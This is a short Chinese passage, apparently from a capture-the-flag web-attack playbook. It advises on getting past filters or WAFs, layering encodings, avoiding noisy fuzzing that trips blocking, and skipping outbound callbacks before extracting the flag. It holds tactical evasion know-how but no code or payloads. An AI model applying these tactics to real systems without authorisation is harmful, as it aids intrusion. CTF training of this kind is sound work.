5. 过门后立即回归正常提取流程(web playbook §6 对应小节),拿到 flag 优先。

## 不要

- 一次叠五种编码——叠了就说不清哪层起效,回退成本高
- 403 = 洞死了 → 换洞类(门 ≠ 洞)
- 全目录 fuzz / 公开 nuclei 全树 / 大字典(会触发 runtime fuzz 拦截 + 打崩靶机)
- 找源站 IP / OAST / 公网回连(无出网环境,浪费时间还留痕)
- 在同一入口同一变体重复发(没过门信号就是没过,换下一行)
